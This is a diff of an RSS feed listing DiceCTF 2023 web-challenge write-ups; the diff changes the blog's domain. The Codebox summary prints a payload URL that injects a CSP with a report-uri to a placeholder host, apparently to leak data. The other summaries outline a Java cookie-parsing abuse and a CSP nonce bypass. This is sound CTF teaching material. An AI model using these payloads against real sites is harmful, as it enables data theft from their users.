@@ -1,15 +1,15 @@
 <rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
     <channel>
-        <title>dicectf23-writeups - Category - My Blog</title>
-        <link>http://r0h1t.me/blog/categories/dicectf23-writeups/</link>
-        <description>dicectf23-writeups - Category - My Blog</description>
+        <title>Dicectf23-Writeups - Category - My Blog</title>
+        <link>http://lu513n.com/blog/categories/dicectf23-writeups/</link>
+        <description>Dicectf23-Writeups - Category - My Blog</description>
         <generator>Hugo -- gohugo.io</generator><language>en</language><managingEditor>rohitnanu.m@gmail.com (Rohit)</managingEditor>
-            <webMaster>rohitnanu.m@gmail.com (Rohit)</webMaster><lastBuildDate>Wed, 08 Feb 2023 00:00:00 &#43;0530</lastBuildDate><atom:link href="http://r0h1t.me/blog/categories/dicectf23-writeups/" rel="self" type="application/rss+xml" /><item>
+            <webMaster>rohitnanu.m@gmail.com (Rohit)</webMaster><lastBuildDate>Wed, 08 Feb 2023 00:00:00 &#43;0530</lastBuildDate><atom:link href="http://lu513n.com/blog/categories/dicectf23-writeups/" rel="self" type="application/rss+xml" /><item>
     <title>Codebox - DiceCTF 2023</title>
-    <link>http://r0h1t.me/blog/posts/codebox/</link>
+    <link>http://lu513n.com/blog/posts/codebox/</link>
     <pubDate>Wed, 08 Feb 2023 00:00:00 &#43;0530</pubDate><author>
                     <name>Rohit</name>
-                </author><guid>http://r0h1t.me/blog/posts/codebox/</guid>
+                </author><guid>http://lu513n.com/blog/posts/codebox/</guid>
     <description><![CDATA[<h4 id="tldr" class="headerLink">
     <a href="#tldr" class="header-mark"></a>tl;dr</h4><ul>
 <li>Use img src to inject csp</li>
@@ -20,10 +20,10 @@
 <p>Final Payload: <code>https://codebox.mc.ax/?code=&amp;code=&lt;img+src=&quot;*;+require-trusted-types-for+'script'+;+report-uri+https://your.domain.com/&quot;+&gt;</code></p>]]></description>
 </item><item>
     <title>Jnotes - DiceCTF 2023</title>
-    <link>http://r0h1t.me/blog/posts/jnotes/</link>
+    <link>http://lu513n.com/blog/posts/jnotes/</link>
     <pubDate>Wed, 08 Feb 2023 00:00:00 &#43;0530</pubDate><author>
                     <name>Rohit</name>
-                </author><guid>http://r0h1t.me/blog/posts/jnotes/</guid>
+                </author><guid>http://lu513n.com/blog/posts/jnotes/</guid>
     <description><![CDATA[<h4 id="tldr" class="headerLink">
     <a href="#tldr" class="header-mark"></a>tl;dr</h4><ul>
 <li>Java mishandles the cookies such that when there is a cookie with a <code>&quot;</code>, it will take all the cookies until there is a <code>&quot;</code> as that cookie&rsquo;s value</li>
@@ -34,10 +34,10 @@
 </ul>]]></description>
 </item><item>
     <title>Recursive-csp - DiceCTF 2023</title>
-    <link>http://r0h1t.me/blog/posts/rescursive-csp/</link>
+    <link>http://lu513n.com/blog/posts/rescursive-csp/</link>
     <pubDate>Wed, 08 Feb 2023 00:00:00 &#43;0530</pubDate><author>
                     <name>Rohit</name>
-                </author><guid>http://r0h1t.me/blog/posts/rescursive-csp/</guid>
+                </author><guid>http://lu513n.com/blog/posts/rescursive-csp/</guid>
     <description><![CDATA[<h4 id="tldr" class="headerLink">
     <a href="#tldr" class="header-mark"></a>tl;dr</h4><ul>
 <li>Craft a payload with a random nonce</li>
